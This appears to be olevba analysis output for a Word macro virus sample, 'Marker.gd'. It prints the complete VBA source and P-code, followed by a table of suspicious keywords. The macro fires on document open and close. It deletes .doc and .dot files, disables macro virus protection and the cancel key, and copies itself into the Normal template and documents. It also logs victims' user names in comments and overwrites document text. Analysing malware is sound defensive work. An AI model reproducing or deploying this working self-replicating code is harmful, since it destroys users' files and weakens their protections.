olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const Marker = "<- VingEMW"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim RMF, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
ShowVisualBasicEditor = False
Application.UserName = "VingEMW"
Application.UserInitials = "VE"
Application.UserAddress = "dodolrmf@mailcity.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If WeekDay(Now()) = 4 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
DI = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   RMF = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   RMF = RMF & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
   NT.CodeModule.AddFromString RMF
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    RMF = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString RMF
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
On Error Resume Next
k1 = "Please ... titip salam buat Unik (EmW),"
k2 = "Fakultas Hukum UNSRI '97"
MsgBox k1 & Chr(13) & k2, 0, "VingEMW"
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "dan"
        .Replacement.Text = "Unik (EMW), I Miss U !!!"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
Return
Finish:
End Sub
' 07:58:457:58:45 AM AM-Thursday, 15 Jun 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 06:24:416:24:41 PM PM-Saturday, 24 Jun 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 07:13:467:13:46 PM PM-Tuesday, 11 Jul 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 08:17:448:17:44 -Sabtu, 15 Jul 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 07:58:47:58:04 PM PM-Monday, 31 Jul 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 12:41:5812:41:58 PM PM-Sunday, 18 Apr 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 02:01:82:01:08 PM PM-Saturday, 22 May 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 02:38:4014:38:40 -Rabu, 26 Mei 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 07:49:2719:49:27 -Rabu, 6 Sep 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 03:49:293:49:29 PM PM-Friday, 8 Sep 2000
' VingEMW
' dodolrmf@mailcity.com

 


' 05:41:25:41:02 PM PM-Monday, 6 Sep 1999
' VingEMW
' dodolrmf@mailcity.com

 


' 06:08:516:08:51 PM PM-Monday, 1 Jan 1990
' VingEMW
' dodolrmf@mailcity.com

 


' 05:13:585:13:58 PM PM-Wednesday, 7 Feb 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 04:23:574:23:57 -Selasa, 13 Feb 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 09:37:139:37:13 -Rabu, 14 Feb 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 06:29:5218:29:52 Grunge Grunge-Monday, 2 Apr 2001
' VingEMW
' dodolrmf@mailcity.com

 


' 04:25:2316:25:23  odp.-pátek, 5 I 2001
' VingEMW
' dodolrmf@mailcity.com

 


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.gd
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9273 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x000A "<- VingEMW"
' 	VarDefn Marker
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	ArgsCall Document_Close 0x0000 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub Document_Close())
' Line #5:
' 	Dim 
' 	VarDefn nmod (As Object)
' Line #6:
' 	Dim 
' 	VarDefn isd (As String)
' Line #7:
' 	Dim 
' 	VarDefn DS
' 	VarDefn NTS
' 	VarDefn DI
' 	VarDefn NTI (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn RMF
' 	VarDefn Users
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #11:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.doc"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #12:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0006 "\*.dot"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #13:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #15:
' 	LitStr 0x0007 "VingEMW"
' 	Ld Application 
' 	MemSt UserName 
' Line #16:
' 	LitStr 0x0002 "VE"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #17:
' 	LitStr 0x0015 "dodolrmf@mailcity.com"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	GoSub InsertIon 
' Line #20:
' 	LineCont 0x0004 0A 00 03 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	GoSub LoggingIn 
' 	EndIf 
' Line #21:
' 	ArgsLd Now 0x0000 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoSub ShowMe 
' 	EndIf 
' Line #22:
' 	GoTo Finish 
' Line #23:
' 	Label InsertIon 
' Line #24:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #25:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #26:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DI 
' Line #27:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NTI 
' Line #28:
' 	Ld DI 
' 	Ld NTI 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #29:
' 	Ld DI 
' 	IfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St NTS 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St RMF 
' Line #32:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #33:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #34:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	Paren 
' 	IfBlock 
' Line #35:
' 	Ld Users 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St Users 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	Ld Users 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	St Users 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartForVariable 
' 	Next 
' Line #41:
' 	LineCont 0x0010 09 00 09 00 12 00 10 00 1E 00 09 00 29 00 09 00
' 	Ld RMF 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:sc AMPM-"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Users 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	St RMF 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #43:
' 	Ld RMF 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	Ld NTS 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld NTI 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St DS 
' Line #48:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St RMF 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld RMF 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #51:
' 	Ld DS 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	Return 
' Line #55:
' 	Label LoggingIn 
' Line #56:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x000A "LogData in"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #57:
' 	GoSub ShowMe 
' Line #58:
' 	Return 
' Line #59:
' 	Label ShowMe 
' Line #60:
' 	OnError (Resume Next) 
' Line #61:
' 	LitStr 0x0027 "Please ... titip salam buat Unik (EmW),"
' 	St k1 
' Line #62:
' 	LitStr 0x0018 "Fakultas Hukum UNSRI '97"
' 	St k2 
' Line #63:
' 	Ld k1 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld k2 
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x0007 "VingEMW"
' 	ArgsCall MsgBox 0x0003 
' Line #64:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #65:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #66:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #67:
' 	LitStr 0x0003 "dan"
' 	MemStWith Then 
' Line #68:
' 	LitStr 0x0018 "Unik (EMW), I Miss U !!!"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #69:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #70:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #71:
' 	LitVarSpecial (False)
' 	MemStWith Format$ 
' Line #72:
' 	EndWith 
' Line #73:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #74:
' 	Return 
' Line #75:
' 	Label Finish 
' Line #76:
' 	EndSub 
' Line #77:
' 	QuoteRem 0x0000 0x002C " 07:58:457:58:45 AM AM-Thursday, 15 Jun 2000"
' Line #78:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #79:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' 	QuoteRem 0x0000 0x002C " 06:24:416:24:41 PM PM-Saturday, 24 Jun 2000"
' Line #85:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #86:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' 	QuoteRem 0x0000 0x002B " 07:13:467:13:46 PM PM-Tuesday, 11 Jul 2000"
' Line #92:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #93:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' 	QuoteRem 0x0000 0x0024 " 08:17:448:17:44 -Sabtu, 15 Jul 2000"
' Line #99:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #100:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' 	QuoteRem 0x0000 0x0029 " 07:58:47:58:04 PM PM-Monday, 31 Jul 2000"
' Line #106:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #107:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x002B " 12:41:5812:41:58 PM PM-Sunday, 18 Apr 1999"
' Line #113:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #114:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' 	QuoteRem 0x0000 0x002B " 02:01:82:01:08 PM PM-Saturday, 22 May 1999"
' Line #120:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #121:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' 	QuoteRem 0x0000 0x0024 " 02:38:4014:38:40 -Rabu, 26 Mei 1999"
' Line #127:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #128:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #129:
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x0023 " 07:49:2719:49:27 -Rabu, 6 Sep 2000"
' Line #134:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #135:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' Line #140:
' 	QuoteRem 0x0000 0x0029 " 03:49:293:49:29 PM PM-Friday, 8 Sep 2000"
' Line #141:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #142:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #143:
' Line #144:
' Line #145:
' Line #146:
' Line #147:
' 	QuoteRem 0x0000 0x0028 " 05:41:25:41:02 PM PM-Monday, 6 Sep 1999"
' Line #148:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #149:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' Line #154:
' 	QuoteRem 0x0000 0x0029 " 06:08:516:08:51 PM PM-Monday, 1 Jan 1990"
' Line #155:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #156:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #157:
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x002C " 05:13:585:13:58 PM PM-Wednesday, 7 Feb 2001"
' Line #162:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #163:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' 	QuoteRem 0x0000 0x0025 " 04:23:574:23:57 -Selasa, 13 Feb 2001"
' Line #169:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #170:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0023 " 09:37:139:37:13 -Rabu, 14 Feb 2001"
' Line #176:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #177:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' 	QuoteRem 0x0000 0x0032 " 06:29:5218:29:52 Grunge Grunge-Monday, 2 Apr 2001"
' Line #183:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #184:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0027 " 04:25:2316:25:23  odp.-pátek, 5 I 2001"
' Line #190:
' 	QuoteRem 0x0000 0x0008 " VingEMW"
' Line #191:
' 	QuoteRem 0x0000 0x0016 " dodolrmf@mailcity.com"
' Line #192:
' Line #193:
' Line #194:
' Line #195:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

